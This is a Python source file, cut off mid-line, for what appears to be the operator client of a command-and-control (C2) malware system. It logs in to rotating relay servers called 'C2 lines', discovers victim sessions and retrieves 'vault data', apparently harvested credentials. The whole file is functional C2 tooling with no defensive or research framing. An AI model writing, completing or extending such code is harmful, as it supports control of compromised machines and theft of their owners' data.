# C2_Client/api_client.py
import requests
from config import RELAY_URL_FORMAT

class ApiClient:
    def __init__(self, main_window):
        self.main_window = main_window
        self.session = requests.Session()
        # These will be set after a successful login
        self.base_url = None 
        self.line_number = None

    def set_line(self, line_number):
        """Sets the communication line for all future requests."""
        self.line_number = line_number
        self.base_url = RELAY_URL_FORMAT.format(line_number)
        print(f"[API Client] Communication line set to: {self.base_url}")

    def _request(self, method, endpoint, **kwargs):
        # The login/register endpoints are special cases. They must find an active server.
        if endpoint == '/auth/login' or endpoint == '/auth/register':
            for i in range(1, 11): # Try lines 1 through 10
                url = RELAY_URL_FORMAT.format(i) + endpoint
                try:
                    # Use a short timeout to quickly find an online server
                    response = self.session.request(method, url, timeout=3, **kwargs)
                    # If we get any valid response (even a 401/409 error), that server is online.
                    if response.status_code < 500:
                        return response.json()
                except requests.exceptions.RequestException:
                    continue # This line is offline, try the next one
            # If all lines failed after the loop
            self.main_window.statusBar().showMessage("API Error: Could not connect to any C2 line. All servers appear to be offline.", 5000)
            return None
        
        # For all other requests, the line must be set.
        if not self.base_url:
            self.main_window.statusBar().showMessage("API Error: Not logged in or communication line not set.", 5000)
            return None
            
        try:
            url = f"{self.base_url}{endpoint}"
            response = self.session.request(method, url, timeout=15, **kwargs)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            error_message = f"API Error: {e}"
            if e.response is not None:
                try:
                    error_details = e.response.json().get("error", "No details provided.")
                    error_message += f" - {error_details}"
                except:
                    pass # Keep the original error if JSON parsing fails
            self.main_window.statusBar().showMessage(error_message, 5000)
            return None

    def register(self, username, password):
        return self._request('POST', '/auth/register', json={'username': username, 'password': password})

    def login(self, username, password):
        return self._request('POST', '/auth/login', json={'username': username, 'password': password})

    def discover_sessions(self, username):
        return self._request('POST', '/c2/discover', json={'username': username})

    def get_all_vault_data(self, username):
        return self._request('POST', '/c2/get_all_vault_data', json={'username': username})

    def get_responses(self, username, session_id):
        retu